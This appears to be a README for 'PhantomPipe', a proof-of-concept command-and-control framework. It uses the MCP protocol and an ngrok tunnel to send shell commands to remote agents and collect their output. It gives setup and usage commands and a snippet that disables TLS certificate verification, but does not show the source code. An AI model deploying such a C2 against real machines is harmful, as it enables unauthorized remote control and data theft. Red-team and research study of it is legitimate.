# 👻🎩📡PhantomPipe: MCP C2

**Lightweight Command & Control over the MCP protocol, exposed via ngrok**  

A proof‑of‑concept C2 framework that uses Server‑Sent Events (SSE) and the MCP protocol for agent registration, command dispatch, and result collection. By tunneling through ngrok, you can quickly expose your C2 server to the public internet for rapid testing and demonstration.

---

## Table of Contents

- [Architecture](#architecture)  
- [Detailed Diagram](#detailed-diagram)  
- [Diagram Explanation](#diagram-explanation)  
- [Prerequisites](#prerequisites)  
- [Installation](#installation)  
- [ngrok Setup](#ngrok-setup)  
- [Usage](#usage)  
  - [Start the Server](#start-the-server)  
  - [Run the Agent](#run-the-agent)  
  - [Enqueue Commands (CLI)](#enqueue-commands-cli)  
  - [Fetch History (CLI)](#fetch-history-cli)  
- [Tool Definitions](#tool-definitions)  
- [Configuration](#configuration)  
- [Contributing](#contributing)  
- [License](#license)  

---

## Architecture

At a high level, MCP C2 comprises three components:

1. **Server** (`server.py`)  
   - FastMCP application listening on port 8000  
   - In-memory stores for agents, command queue, and results  
   - Exposes MCP tools over SSE at `/mcp`

2. **Agent** (`agent.py`)  
   - Connects via SSE, registers itself, polls for commands, executes them locally, and uploads results

3. **CLI Client** (`client.py`)  
   - Enqueues commands for agents  
   - Fetches full command/result history

All communication goes over the public SSE endpoint provided by ngrok.

---

## Detailed Flow

```mermaid
flowchart TD
  %% ────────────────────── Local server ──────────────────────
  subgraph Local_Server["Local&nbsp;Server"]
    direction TB
    Srv["server.py<br/>FastMCP&nbsp;@&nbsp;port&nbsp;8000"]
    Stores["In‑memory&nbsp;Stores:<br/>•&nbsp;agents<br/>•&nbsp;command_queue<br/>•&nbsp;results"]
    Tools["Registered&nbsp;MCP&nbsp;Tools:<br/>•&nbsp;register_agent()<br/>•&nbsp;enqueue_command()<br/>•&nbsp;get_next_command()<br/>•&nbsp;upload_result()<br/>•&nbsp;get_results()"]
    Srv --> Stores
    Srv --> Tools
  end

  %% ────────────────────── ngrok tunnel ──────────────────────
  subgraph Ngrok_Tunnel["ngrok&nbsp;Tunnel"]
    NG["ngrok<br/>https\://YOUR_ID.ngrok.io&nbsp;↔&nbsp;localhost:8000"]
  end

  %% ────────────────────── public SSE endpoint ───────────────
  subgraph Public_SSE["Public&nbsp;SSE&nbsp;Endpoint"]
    Pub["/mcp&nbsp;on&nbsp;https\://YOUR_ID.ngrok.io"]
  end

  %% ────────────────────── agents (× N) ──────────────────────
  subgraph Agents["Agents&nbsp;(agent.py)&nbsp;×&nbsp;N"]
    direction TB
    A1["1\\.&nbsp;SSE&nbsp;connect&nbsp;→&nbsp;/mcp"]
    A2["2\\.&nbsp;JSON‑RPC&nbsp;→&nbsp;register_agent(id)"]
    A3["3\\.&nbsp;Loop:&nbsp;get_next_command()"]
    A4["4\\.&nbsp;Execute&nbsp;shell&nbsp;command"]
    A5["5\\.&nbsp;JSON‑RPC&nbsp;→&nbsp;upload_result()"]
    A1 --> A2 --> A3 --> A4 --> A5 --> A3
  end

  %% ────────────────────── CLI client ────────────────────────
  subgraph CLI["CLI&nbsp;Client&nbsp;(client.py)"]
    direction TB
    C1["Enqueue:<br/>JSON‑RPC&nbsp;→&nbsp;enqueue_command(agent_id,&nbsp;cmd,&nbsp;args)"]
    C2["Fetch:<br/>JSON‑RPC&nbsp;→&nbsp;get_results(agent_id)"]
  end

  %% ────────────────────── communication flows ───────────────
  Srv -- listens&nbsp;on&nbsp;port&nbsp;8000 --> Ngrok_Tunnel
  Ngrok_Tunnel -- forwards&nbsp;port --> Public_SSE
  Public_SSE -- SSE&nbsp;+&nbsp;RPC --> Agents
  Agents -- RPC --> Public_SSE
  Public_SSE -- RPC --> CLI
  CLI -- RPC --> Public_SSE

  %% ────────────────────── tool interactions ─────────────────
  Public_SSE -- register_agent --> Tools
  Tools -- store&nbsp;agent --> Stores

  Public_SSE -- enqueue_command --> Tools
  Tools -- append&nbsp;command --> Stores

  Public_SSE -- get_next_command --> Tools
  Tools -- read&nbsp;command --> Stores

  Public_SSE -- upload_result --> Tools
  Tools -- write&nbsp;result --> Stores

  Public_SSE -- get_results --> Tools
  Tools -- read&nbsp;results --> Stores



```



---

## Diagram Explanation

- **Local Server**  
  - **`server.py`** runs a FastMCP app on port 8000.  
  - **In‑Memory Stores** hold registered agents, pending commands, and uploaded results.  
  - **MCP Tools** implement the core API:  
  1. `register_agent(agent_id)`  
 2. `enqueue_command(agent_id, command, args)`  
 3. `get_next_command(agent_id)`  
 4. `upload_result(agent_id, command_id, exit_code, output)`  
 5. `get_results(agent_id)`

- **ngrok Tunnel**  
  - Maps your local port 8000 to a public URL (`https://<ID>.ngrok.io`).  
  - Can be auto‑launched by `server.py` or manually via:  
    ```bash
    ngrok http 8000 --region=us
    ```

- **Public SSE Endpoint**  
  - Clients connect to `/mcp` at the ngrok URL for SSE streams and JSON‑RPC tool calls.

- **Agent (`agent.py`)**  
  1. Establishes SSE connection.  
  2. Calls `register_agent()`.  
  3. Loops: fetches next command (`get_next_command()`), runs it locally, and uploads the output (`upload_result()`).

- **CLI Client (`client.py`)**  
  - Uses the same SSE endpoint to dispatch (`enqueue_command()`) or retrieve (`get_results()`) work.

- **Communication Arrows**  
  - **Server → ngrok**: local port 8000 is forwarded.  
  - **ngrok → Public**: exposes it to the internet.  
  - **Public → Agent/CLI**: SSE stream and RPC calls.  
  - **Agent/CLI → Public**: RPC calls back to the server.

---

## Prerequisites

- **Python** 3.8+  
- **pip**  
- **ngrok** (installed and on your PATH)  
- Python packages:
  ```bash
  pip install mcp pyngrok certifi
  ```

---

## Installation

1. **Clone the repository**  
   ```bash
   git clone https://github.com/mbhatt1/PhantomPipe.git
   cd PhantomPipe
   ```
2. **Set up a virtual environment & install dependencies**  
   ```bash
   python3 -m venv venv
   source venv/bin/activate
   pip install --upgrade pip
   pip install mcp pyngrok certifi
   ```

---

## ngrok Setup

1. **Authenticate your ngrok account**  
   ```bash
   ngrok authtoken YOUR_NGROK_AUTH_TOKEN
   ```
2. **Expose local port 8000**  
   The `server.py` script auto‑launches ngrok. To run manually:  
   ```bash
   ngrok http 8000 --region=us
   ```
   Note the **Forwarding** URL (e.g. `https://abcd1234.ngrok.io`) and append `/mcp` for clients.

---

## Usage

### Start the Server

```bash
python server.py
```
- Binds FastMCP on port 8000.  
- Launches ngrok and prints:
  ```
  [i] Starting ngrok tunnel on port 8000...
  [i] Public URL: https://<ID>.ngrok.io/mcp
  ```

### Run the Agent

```bash
python agent.py \
  --server-url https://<ID>.ngrok.io \
  --agent-id myagent
```
- **Registers** agent `myagent`.  
- **Polls** for commands, executes them, and **uploads** results.

### Enqueue Commands (CLI)

```bash
python client.py \
  --server-url https://<ID>.ngrok.io \
  --agent-id myagent \
  --command whoami \
  --args -a -b
```
- Dispatches `whoami -a -b` to `myagent`.

### Fetch History (CLI)

```bash
python client.py \
  --server-url https://<ID>.ngrok.io \
  --agent-id myagent \
  --history
```
- Retrieves and prints all past command results for `myagent`.

---

## Tool Definitions

| Tool Name         | Input Params                                            | Output                                           |
|-------------------|---------------------------------------------------------|--------------------------------------------------|
| `register_agent`  | `{ agent_id: string }`                                  | `{ ok: true }`                                   |
| `enqueue_command` | `{ agent_id, command: string, args: string[] }`         | `{ ok: true }`                                   |
| `get_next_command`| `{ agent_id: string }`                                  | `{ command_id, command, args }` or empty fields  |
| `upload_result`   | `{ agent_id, command_id, exit_code: int, output: string }` | `{ ok: true }`                                |
| `get_results`     | `{ agent_id: string }`                                  | `[{ command_id, exit_code, output, completed_at }]` |

---

## Configuration

- **SSL/TLS**  
  Uses `certifi` for CA bundle on macOS.  
  To disable verification (self‑signed certs):
  ```python
  import ssl
  ssl._create_default_https_context = ssl._create_unverified_context
  ```
- **Agent ID**  
  Defaults to the machine’s hostname; override with `--agent-id`.
- **Persistence**  
  In-memory only (proof‑of‑concept).

---

## Contributing

1. Fork the repository  
2. Create a feature branch:  
   ```bash
   git checkout -b feature/your-feature
   ```
3. Commit & push your changes:  
   ```bash
   git push origin feature/your-feature
   ```
4. Open a Pull Request

---

## License

This project is licensed under the MIT License. See [LICENSE](LICENSE) for details.

## Youtube Demo

[](https://www.youtube.com/watch?v=DUCduiyb1lU)

© 2025 Shrewd. Play nice; hack hard.


